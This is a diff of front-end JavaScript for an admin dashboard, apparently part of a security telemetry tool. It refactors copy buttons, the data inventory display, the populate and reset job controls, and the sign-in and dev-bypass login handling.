   e.target.disabled = false;
 };
 
 // ── Terminal command copy buttons ─────────────────────────────────────
-document.querySelectorAll('.term-block .term-cp').forEach(btn => {
+document.querySelectorAll('.term-cp').forEach(btn => {
   btn.onclick = async () => {
     const txt = btn.nextElementSibling.textContent;
     try { await navigator.clipboard.writeText(txt); } catch (e) {}
-    btn.textContent = 'copied'; btn.classList.add('ok');
-    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('ok'); }, 1500);
+    btn.textContent = 'Copied'; btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1500);
   };
 });
 
 // ── Project data (populate / reset) ─────────────────────────────────────
 const fmtBytes = (b) => b > 1048576 ? (b / 1048576).toFixed(1) + ' MB' : (b / 1024).toFixed(0) + ' KB';
+const put = (id, v) => { document.getElementById(id).textContent = v ?? 'n/a'; };
+const num = (v) => Number(v || 0).toLocaleString();
+function jobLog(text) {
+  const log = document.getElementById('dLog');
+  log.textContent = text;
+  log.scrollTop = 1e9;
+  document.getElementById('dJobPanel').hidden = !text;
+}
+function dataError(text) {
+  const el = document.getElementById('dErr');
+  el.textContent = text; el.hidden = !text;
+}
 let dataTimer = null;
 async function refreshData() {
   if (!TOKEN) return;
   const r = await call('GET', '/admin/data');
-  if (!r.ok) { document.getElementById('dInv').textContent = `(${r.status})`; return; }
+  if (!r.ok) { dataError(`Could not read the inventory (HTTP ${r.status}). This needs the admin role.`); return; }
+  dataError('');
   const { inventory: inv, job } = r.data;
   const tel = Object.entries(inv.files).find(([k]) => k.includes('telemetry'))?.[1];
   const t = inv.tables;
-  document.getElementById('dInv').textContent =
-    `· ${inv.total_rows.toLocaleString()} data rows (events ${(t.normalized_events || 0).toLocaleString()}, detections ${t.detections || 0}, incidents ${t.incidents || 0}, reports ${t.generated_reports || 0})` +
-    (tel ? ` · sensor logs ${fmtBytes(tel.bytes)}` : '');
+  put('dRows', num(inv.total_rows)); put('dEvents', num(t.normalized_events)); put('dDet', num(t.detections));
+  put('dInc', num(t.incidents)); put('dRep', num(t.generated_reports)); put('dLogs', tel ? fmtBytes(tel.bytes) : 'n/a');
   const busy = job.status === 'running';
-  document.getElementById('dLog').textContent = job.kind ? `[${job.kind} · ${job.status}]\n` + job.log.join('\n') : '';
-  document.getElementById('dLog').scrollTop = 1e9;
+  jobLog(job.kind ? `[${job.kind} · ${job.status}]\n` + job.log.join('\n') : '');
   document.getElementById('dPopulate').disabled = document.getElementById('dReset').disabled = busy;
   clearTimeout(dataTimer);
   dataTimer = setTimeout(refreshData, busy ? 2000 : 15000);
 }
 async function startData(path, body) {
+  if (!TOKEN) { jobLog('Sign in first.'); return; }
   const r = await call('POST', path, body);
-  const log = document.getElementById('dLog');
-  if (!r.ok || r.data.ok === false) log.textContent = 'refused: ' + JSON.stringify(r.data?.detail || r.data?.error);
-  refreshData();
+  if (!r.ok || r.data.ok === false) jobLog('Refused: ' + JSON.stringify(r.data?.detail || r.data?.error));
+  else refreshData();
 }
 document.getElementById('dPopulate').onclick = () => startData('/admin/data/populate', {
   corpus_events: +document.getElementById('dCorpus').value, live_waves: +document.getElementById('dWaves').value });
 document.getElementById('dReset').onclick = () => {
   const c = document.getElementById('dConfirm');
-  if (c.value !== 'RESET') { c.focus(); document.getElementById('dLog').textContent = 'type RESET in the box to confirm'; return; }
+  if (c.value !== 'RESET') { c.focus(); jobLog('Type RESET in the box to confirm.'); return; }
   c.value = '';
   startData('/admin/data/reset', { confirm: 'RESET' });
 };
 
 // ── Auth ────────────────────────────────────────────────────────────────
+const who = document.getElementById('tbWho'), authErr = document.getElementById('tbErr');
 function setToken(tok) {
   TOKEN = tok || '';
   try { TOKEN ? sessionStorage.setItem('st_tb_token', TOKEN) : sessionStorage.removeItem('st_tb_token'); } catch (_) {}
   refreshWho();
 }
 async function refreshWho() {
-  const who = document.getElementById('tbWho');
-  if (!TOKEN) { who.textContent = 'not signed in'; who.className = 'note'; return; }
+  document.body.classList.toggle('signed-in', !!TOKEN);
+  if (!TOKEN) { who.textContent = ''; return; }
   const r = await call('GET', '/users/me');
-  if (!r.ok) { setToken(''); who.textContent = 'session expired: sign in'; return; }
-  who.innerHTML = `<span class="PASS">signed in</span> ${h(r.data.email)} · ${h(r.data.role)}`;
+  if (!r.ok) { setToken(''); authErr.textContent = 'Session expired. Sign in again.'; return; }
+  who.innerHTML = `<b>${h(r.data.email)}</b> · ${h(r.data.role)}`;
+  authErr.textContent = '';
+  document.getElementById('tbSignin').open = false;
   refreshData();
 }
-document.getElementById('tbLogin').onclick = async () => {
+document.getElementById('tbForm').onsubmit = async (e) => {
+  e.preventDefault();
   const f = new URLSearchParams({ username: document.getElementById('tbEmail').value.trim(), password: document.getElementById('tbPass').value });
   const r = await call('POST', '/auth/login', f, { auth: false });
   if (r.ok) setToken(r.data.access_token);
-  else document.getElementById('tbWho').innerHTML = `<span class="FAIL">${h(r.data?.detail || 'login failed')}</span>`;
+  else authErr.textContent = typeof r.data?.detail === 'string' ? r.data.detail : 'Sign-in failed.';
 };
 document.getElementById('tbBypass').onclick = async () => {
   const r = await call('POST', '/auth/dev-bypass', {}, { auth: false });
   if (r.ok) setToken(r.data.access_token);
-  else document.getElementById('tbWho').innerHTML = `<span class="FAIL">dev bypass disabled (DEV_BYPASS=0)</span>`;
+  else authErr.textContent = 'Dev bypass is disabled (DEV_BYPASS=0).';
 };
 document.getElementById('tbLogout').onclick = () => setToken('');
 refreshWho();
